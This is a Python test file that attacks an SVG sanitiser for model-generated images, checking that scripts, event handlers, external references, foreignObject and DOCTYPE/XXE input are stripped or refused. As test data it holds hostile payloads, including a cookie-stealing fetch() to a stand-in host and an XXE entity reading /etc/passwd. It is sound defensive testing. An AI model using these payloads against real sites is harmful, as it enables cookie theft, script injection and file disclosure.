"""Adversarial tests for the SVG sanitiser.

SVG is markup, so model-authored SVG is untrusted content rendered in a
browser -- the same class of risk `media_gen/download.py`'s content-type
allowlist comment already names. These tests are written as attacks, not
as feature checks: each one is a payload that must not survive.

The sanitiser is one of two controls. The other is the render context
(`<img src="data:image/svg+xml;...">`, where browsers do not run scripts
or fetch external references), and that one does not depend on this file
being perfect. These tests cover the half that does.
"""

from __future__ import annotations

import pytest

from media_gen.svg_sanitize import (
    ALLOWED_ELEMENTS,
    MAX_SVG_BYTES,
    SvgRejected,
    extract_svg,
    sanitize_svg,
)

OK = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><rect x="1" y="1" width="8" height="8" fill="#333"/></svg>'


class TestScriptIsRemoved:
    def test_a_script_element_does_not_survive(self):
        out = sanitize_svg(
            '<svg xmlns="http://www.w3.org/2000/svg">'
            '<script>fetch("https://evil.invalid/"+document.cookie)</script>'
            '<rect width="1" height="1"/></svg>'
        )

        assert "script" not in out.lower()
        assert "evil.invalid" not in out

    def test_the_script_payload_text_goes_with_it(self):
        """Removed whole, not unwrapped -- a `<script>`'s *text* is the
        payload, so keeping its children would keep the payload."""
        out = sanitize_svg(
            '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'
        )

        assert "alert" not in out

    @pytest.mark.parametrize(
        "handler",
        ["onload", "onclick", "onmouseover", "onfocus", "onbegin", "onerror", "onanimationend"],
    )
    def test_every_event_handler_is_dropped(self, handler):
        """An allowlist, so a handler nobody thought of is excluded by
        default rather than needing to be added to a blocklist."""
        out = sanitize_svg(
            f'<svg xmlns="http://www.w3.org/2000/svg"><rect {handler}="alert(1)" '
            'width="1" height="1"/></svg>'
        )

        assert handler not in out.lower()
        assert "alert" not in out

    def test_a_javascript_url_in_style_is_dropped(self):
        out = sanitize_svg(
            '<svg xmlns="http://www.w3.org/2000/svg">'
            '<rect style="background:url(javascript:alert(1))" width="1" height="1"/></svg>'
        )

        assert "javascript" not in out.lower()


class TestExternalReferencesAreRemoved:
    def test_an_image_element_is_dropped_entirely(self):
        """`<image href>` exists to fetch external bytes; there is no safe
        subset of it for generated output."""
        out = sanitize_svg(
            '<svg xmlns="http://www.w3.org/2000/svg">'
            '<image href="https://evil.invalid/tracker.png" width="1" height="1"/></svg>'
        )

        assert "evil.invalid" not in out
        assert "<image" not in out.lower()

    def test_a_remote_use_reference_is_dropped(self):
        out = sanitize_svg(
            '<svg xmlns="http://www.w3.org/2000/svg">'
            '<use href="https://evil.invalid/x.svg#icon"/></svg>'
        )

        assert "evil.invalid" not in out

    def test_a_local_fragment_reference_survives(self):
        """Non-vacuity: the reference check must distinguish, not just
        delete everything -- `<use href="#id">` is how legitimate SVG
        reuses a shape."""
        out = sanitize_svg(
            '<svg xmlns="http://www.w3.org/2000/svg">'
            '<defs><rect id="box" width="2" height="2"/></defs><use href="#box"/></svg>'
        )

        assert "#box" in out

    def test_a_url_fill_reaching_the_network_is_dropped(self):
        out = sanitize_svg(
            '<svg xmlns="http://www.w3.org/2000/svg">'
            '<rect fill="url(https://evil.invalid/p.png)" width="1" height="1"/></svg>'
        )

        assert "evil.invalid" not in out

    def test_a_css_import_in_style_is_dropped(self):
        out = sanitize_svg(
            '<svg xmlns="http://www.w3.org/2000/svg">'
            '<rect style="@import url(https://evil.invalid/x.css)" width="1" height="1"/></svg>'
        )

        assert "evil.invalid" not in out
        assert "@import" not in out


class TestEmbeddedMarkupIsRemoved:
    def test_foreignobject_does_not_survive(self):
        """It embeds arbitrary HTML inside SVG and would reopen every
        control above at once."""
        # Well-formed on purpose: malformed markup is refused at the parse
        # step, which would mean this test passed without ever exercising
        # the element-stripping it is named for.
        out = sanitize_svg(
            '<svg xmlns="http://www.w3.org/2000/svg">'
            '<foreignObject width="10" height="10">'
            '<div xmlns="http://www.w3.org/1999/xhtml" onclick="alert(1)">hi</div>'
            "</foreignObject></svg>"
        )

        assert "foreignObject" not in out
        assert "onclick" not in out.lower()
        assert "alert" not in out

    def test_an_anchor_is_dropped(self):
        """A generated illustration has no business carrying links."""
        out = sanitize_svg(
            '<svg xmlns="http://www.w3.org/2000/svg">'
            '<a href="https://evil.invalid"><rect width="1" height="1"/></a></svg>'
        )

        assert "evil.invalid" not in out


class TestStructuralRefusals:
    def test_a_doctype_is_refused_outright(self):
        """How XXE and entity-expansion arrive. Refusing the construct is
        cheaper than reasoning about which parser is in use."""
        with pytest.raises(SvgRejected):
            sanitize_svg(
                '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
                '<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>'
            )

    def test_an_entity_declaration_is_refused(self):
        with pytest.raises(SvgRejected):
            sanitize_svg('<!ENTITY a "b"><svg xmlns="http://www.w3.org/2000/svg"/>')

    def test_unparseable_markup_is_refused_not_best_efforted(self):
        """A caller that got back "something" would render it."""
        with pytest.raises(SvgRejected):
            sanitize_svg("<svg><rect></svg>")

    def test_a_non_svg_root_is_refused(self):
        with pytest.raises(SvgRejected):
            sanitize_svg("<html><body><script>alert(1)</script></body></html>")

    def test_empty_input_is_refused(self):
        with pytest.raises(SvgRejected):
            sanitize_svg("   ")

    def test_an_oversized_document_is_refused(self):
        oversized = (
            '<svg xmlns="http://www.w3.org/2000/svg">'
            + '<rect width="1" height="1"/>' * 20000
            + "</svg>"
        )
        assert len(oversized.encode()) > MAX_SVG_BYTES

        with pytest.raises(SvgRejected):
            sanitize_svg(oversized)

    def test_deep_nesting_is_refused(self):
        deep = '<svg xmlns="http://www.w3.org/2000/svg">' + "<g>" * 60 + "</g>" * 60 + "</svg>"

        with pytest.raises(SvgRejected):
            sanitize_svg(deep)


class TestLegitimateDrawingSurvives:
    """The sanitiser is useless if it strips real diagrams. These are the
    non-vacuity half -- without them every test above would pass on a
    function that returned an empty `<svg/>`."""

    def test_shapes_and_geometry_survive(self):
        out = sanitize_svg(OK)

        assert "<rect" in out
        assert 'fill="#333"' in out
        assert 'viewBox="0 0 10 10"' in out

    def test_text_survives(self):
        out = sanitize_svg(
            '<svg xmlns="http://www.w3.org/2000/svg">'
            '<text x="5" y="5" font-size="12" text-anchor="middle">Q3 Revenue</text></svg>'
        )

        assert "Q3 Revenue" in out
        assert 'font-size="12"' in out

    def test_a_gradient_survives(self):
        out = sanitize_svg(
            '<svg xmlns="http://www.w3.org/2000/svg"><defs>'
            '<linearGradient id="g"><stop offset="0" stop-color="#fff"/></linearGradient>'
            '</defs><rect fill="url(#g)" width="1" height="1"/></svg>'
        )

        assert "linearGradient" in out
        assert "stop-color" in out

    def test_the_namespace_is_always_present(self):
        """Required for an `<img>` to render the result at all."""
        out = sanitize_svg('<svg viewBox="0 0 2 2"><rect width="1" height="1"/></svg>')

        assert "http://www.w3.org/2000/svg" in out

    def test_the_allowlist_actually_contains_drawing_primitives(self):
        for tag in ("path", "rect", "circle", "text", "g"):
            assert tag in ALLOWED_ELEMENTS

    def test_the_allowlist_excludes_the_dangerous_ones(self):
        for tag in ("script", "foreignObject", "image", "a", "animate", "set"):
            assert tag not in ALLOWED_ELEMENTS


class TestExtractSvg:
    def test_it_recovers_svg_from_a_fenced_reply(self):
        reply = f"Sure! Here is the diagram:\n```svg\n{OK}\n```"

        assert extract_svg(reply).startswith("<svg")

    def test_it_recovers_svg_after_a_preamble(self):
        assert extract_svg(f"Here you go: {OK} Hope that helps!").endswith("</svg>")

    def test_a_reply_with_no_svg_is_refused(self):
        with pytest.raises(SvgRejected):
            extract_svg("I'm sorry, I can't draw that.")

    def test_extraction_does_not_sanitize(self):
        """Separate steps on purpose: extraction finds the span, the
        sanitiser decides whether it may be rendered. Collapsing them would
        make it easy to call the wrong one."""
        raw = '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'

        assert "script" in extract_svg(f"here: {raw}")
